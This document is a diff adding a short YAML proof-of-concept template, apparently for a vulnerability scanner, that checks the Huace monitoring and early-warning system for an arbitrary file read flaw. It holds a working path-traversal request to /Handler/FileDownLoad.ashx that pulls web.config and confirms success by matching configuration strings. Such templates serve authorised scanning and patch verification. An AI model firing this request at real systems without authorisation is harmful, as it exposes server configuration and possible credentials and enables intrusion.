@@ -1,0 +1,17 @@
+id: poc-yaml-hc-jian-ce-yu-jing-system-file-read
+info:
+  name: 华测监测预警系统 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 华测监测预警系统
+requests:
+- method: POST
+  path: /Handler/FileDownLoad.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: filename=1&filepath=..%2F..%2Fweb.config
+  expression: status_code == 200 && contains(body,"<add key=\"SkinId\" value=\"flat\"
+    />") && contains(body,"<add key=\"SysName\" value=\"华测监测预警系统2.2\" />") && contains(body,"<appSettings>")
+variables: {}
+transport: http
